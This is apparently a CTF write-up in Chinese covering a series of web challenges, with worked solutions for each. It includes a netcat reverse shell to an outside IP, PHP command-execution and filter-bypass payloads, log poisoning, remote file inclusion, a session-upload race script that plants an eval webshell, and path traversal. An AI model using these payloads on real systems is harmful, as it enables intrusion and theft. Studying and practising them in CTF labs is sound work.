## Base64多层嵌套解码
看源码
```js
           const correctPassword = "SXpVRlF4TTFVelJtdFNSazB3VTJ4U1UwNXFSWGRVVlZrOWNWYzU=";
            
            function validatePassword(input) {
                let encoded = btoa(input);
                encoded = btoa(encoded + 'xH7jK').slice(3);
                encoded = btoa(encoded.split('').reverse().join(''));
                encoded = btoa('aB3' + encoded + 'qW9').substr(2);
                return btoa(encoded) === correctPassword;
            }
```
流程就是
```
input->base64编码得到x1->在x1后面加'xH7jK'得到x2->再对x2进行base64编码得到x3->再删掉x3的前三个字符得到x4->对x4进行反转得到x5->对x5进行base64编码得到x6->在x6的前后各加aB3和qW9得到x7->对x7 base64编码得到x8->对x8删掉前两个字符得到x9->再对x9 base64编码得到SXpVRlF4TTFVelJtdFNSazB3VTJ4U1UwNXFSWGRVVlZrOWNWYzU=
```
可以写脚本暴力破解
```python
import base64  
import binascii  
  
raw_data = "SXpVRlF4TTFVelJtdFNSazB3VTJ4U1UwNXFSWGRVVlZrOWNWYzU="  
x9 = base64.b64decode(raw_data)  
print(f"x9 = {x9.decode('utf-8')}")  
b64_list = r"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="  
def is_b64_string(s):  
    if not isinstance(s, str):  
        return False  
    return all(char in b64_list for char in s)  
  
for i in b64_list:  
    for j in b64_list:  
        x8 = f"{i}{j}{x9.decode('utf-8')}"  
        try:  
            x7_raw = base64.b64decode(x8)  
            x7 = x7_raw.decode("latin-1")  
            if not is_b64_string(x7):  
                continue  
            x6 = x7[3:-3]  
            x5_raw = base64.b64decode(x6)  
            x5 = x5_raw.decode("latin-1")  
            x4 = x5[::-1]  
            for k in b64_list:  
                for l in b64_list:  
                    for m in b64_list:  
                        x3 = f"{k}{l}{m}{x4}"  
                        try:  
                            x2_raw = base64.b64decode(x3)  
                            x2 = x2_raw.decode('latin-1')  
                            if not is_b64_string(x2):  
                                continue  
                            x1 = x2[0:-5]  
                            input_raw = base64.b64decode(x1)  
                            input_str = input_raw.decode('latin-1')  
                            if not is_b64_string(input_str):  
                                continue  
                            print(f"input = {input_str}")  
                        except:  
                            pass  
        except:  
            pass
```
结果发现密码不止一种。
## HTTPS中间人攻击
这一关给了流量包和一个sslkey的log，可以看到在TCP三次握手之后，后续在应用层的数据传输都被加密。如果拿到密钥就可以解密。
这时就需要导入日志文件，
```
打开Wireshark，依次点击：编辑 -> 首选项 -> Protocols
找到TLS选项，在filename中导入获得的密钥
```
这样就可以在一个POST包里看到flag
## Cookie伪造
用弱口令`guest/guest`登录，再抓包把Cookie里的`role`改为admin，再放包。
## 一句话木马变形
这里的木马只允许出现字母数字,下划线，圆括号，和分号。
这就要用到无参RCE了·
可以试一下
```
system(ls);
```
可以执行命令。
```
code=eval(reset(getallheaders()));
```
在请求包里写一个请求头，内容是`system('cat flag.php');`
这样就可以命令执行。
也可以
```
highlight_file(next(array_reverse(scandir(getcwd()))));
```
这样也可以。
## 反弹shell
直接
```
netcat 121.89.81.39 2333 -e /bin/bash
```
在服务器监听
```
nc -lvp 2333
```
## 管道符绕过过滤
直接`|ls`就可以命令执行，但是`|cat flag.php`不行，可能是对输出做了过滤
```
|cat flag.php|base64
```
就可以了
或者
```
|grep flag|xargs tac
```
## 无字母数字代码执行
```
$_="^$^^@@"^"-]-*%-";$__="@^"^",-";$_($__);
```
等价于`system(ls);`
或者利用
```php

<?php

$system="system";

$command="tac flag.php"; 

echo '(~'.urlencode(~$system).')(~'.urlencode(~$command).');';
?>

```
得到payload
## 无字母数字命令执行
可以用临时文件包含
源码
```python
import requests  
import time  
url = "http://96b69e4d-8a17-4754-9df0-1b7bb5a88456.challenge.ctf.show/"  
  
#payload.txt 内容为需要执行的命令 这里为 tac /var/www/html/flag.php
file = {"file": open("payload.txt", "r")}  
  
data = {"code": ". /???/????????[@-[]"}  #使用通配符确保命中临时文件名称
  
while True:  
    response = requests.post(url, files=file, data=data)  
    if response.text.find("CTF{")!= -1:  
        flag = response.text[response.text.find("CTF{"):-1]  
        print(flag)  
        break  
    else:  
        print("Waiting for flag...")  
        time.sleep(1)
```
通过不断提交来命令执行
其中`. 文件路径`可以执行文件里的命令，这是linux语法，例如我在888.txt里写`env`再
```
. 888.txt
```
就会输出env的执行结果。
## 日志文件包含
随便输入内容，在响应包了可以看到服务器是nginx。
输入
```
/var/log/nginx/access.log
```
可以看到服务器日志，所以可以往日志写入木马。
通过日志内容，可以把木马写入UA头。
再文件包含。
## php://filter读源码
```
php://filter/read=convert.base64-encode/resource=index.php
```
可以读取到源码是
```php
 <?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['file'])): ?>
            <div class="form-group">
                <label>Include Result:</label>
                <div class="result"><?php
                    include "db.php";
                    function validate_file_contents($file) {

                        if(preg_match('/[^a-zA-Z0-9\/\+=]/', $file)){
                            return false;   
                        }
                        return true;
                    }

                    try {
                        // Validate input characters
                        if (preg_match('/log|nginx|access/', $_POST['file'])) {
                            throw new Exception('Invalid input. Please enter a valid file path.');
                        }
                        
                        ob_start();
                        echo file_get_contents($_POST['file']);
                        $output = ob_get_clean();
                        if(!validate_file_contents($output)){
                            throw new Exception('Invalid input. Please enter a valid file path.');
                        }else{
                            echo 'File contents:';
                            echo '<br>';
                            echo $output;
                        }
                       
                    } catch (Exception $e) {
                        echo 'Error: ' . htmlspecialchars($e->getMessage());
                    }
                ?></div>
```
发现db.php读取一下源码
```
php://filter/read=convert.base64-encode/resource=db.php
```
得到flag
## 远程文件包含
```
http://your-shell.com/1
```
再POST
```
1=system('tac flag.php');
```
## 临时文件包含
伪协议均被过滤，但是随便输入一个东西后发现有Cookie，说明开启了session，这里用临时文件按上传配合session来getshell。
```python
import requests  
import threading  
  
session = requests.session()  
sess = 'ctfshow'  
url = "http://1b06b6bc-a8e2-4a8c-b1e2-171e67842485.challenge.ctf.show/"  
  
data1 = {  
    'PHP_SESSION_UPLOAD_PROGRESS': '<?php echo "success";file_put_contents("/var/www/html/1.php","<?php eval(\\$_POST[1]);?>");?>'  
}  
file = {  
    'file': 'ctfshow'  
}  
cookies = {  
    'PHPSESSID': sess  
}  
  
  
def write():  
    while True:  
        r = session.post(url, data=data1, files=file, cookies=cookies)  
  
  
def read():  
    while True:  
        r = session.get(url + "?path=/tmp/sess_ctfshow", cookies=cookies)  
        if 'success' in r.text:  
            print("shell 地址为：" + url + "1.php")  
            exit()  
  
  
threads = [threading.Thread(target=write),  
           threading.Thread(target=read)]  
for t in threads:  
    t.start()
```
上传成功后就可以getshell了。
## 路径遍历突破
读取test.txt内容为
```
test.txt内容为： contents from test.txt  
  
key = 3f86ff1c5d5d4d1d
```
读取index.php内容为
```php
```PHP
<?php

if (isset($_GET['path']) && $_GET['path'] !== '') {
$path = $_GET['path'];
if(preg_match('/data|log|access|pear|tmp|zlib|filter|:/', $path) ){
echo '<span style="color:#f00;">禁止访问敏感目录或文件</span>';
exit;
}

#禁止以/或者../开头的文件名
if(preg_match('/^(\.|\/)/', $path)){
echo '<span style="color:#f00;">禁止以/或者../开头的文件名</span>';
exit;
}

echo $path."内容为：\n";
echo str_replace("\n", "<br>", htmlspecialchars(file_get_contents($path)));
} else {
echo '<span style="color:#888;">目标flag文件为/flag.txt</span>';
}
?>
```

输入
```
ctf/../../../../flag.txt
```
就可以穿越到根目录读取到flag
## 